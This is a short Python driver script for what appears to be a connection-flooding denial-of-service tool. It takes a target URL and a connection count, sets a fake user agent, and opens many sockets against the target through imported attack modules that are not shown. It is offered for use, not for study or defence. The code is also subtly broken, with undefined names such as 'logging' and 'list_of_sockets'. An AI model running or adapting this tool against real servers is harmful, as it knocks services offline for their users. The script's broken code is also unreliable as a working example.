#!/usr/bin/env python3

import socket
from parser import Parser as p
from attack import start_attack
from store import store_data
from urllib.parse import urlparse


def attack(m):
    for _ in range(int(result["connection_count"])):
        try:
            s = a.initialize_socket(m)
            a.perform_attack(s, result["connection_count"], m)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)


#veni vidi vici
if __name__ == '__main__':
    result = []
    result = p.parse_arguments()
    a = start_attack()
    m = a.form_url(result["url"])
    m.create_fake_useragent()
    m.prepare_for_sending()
    attack(m)





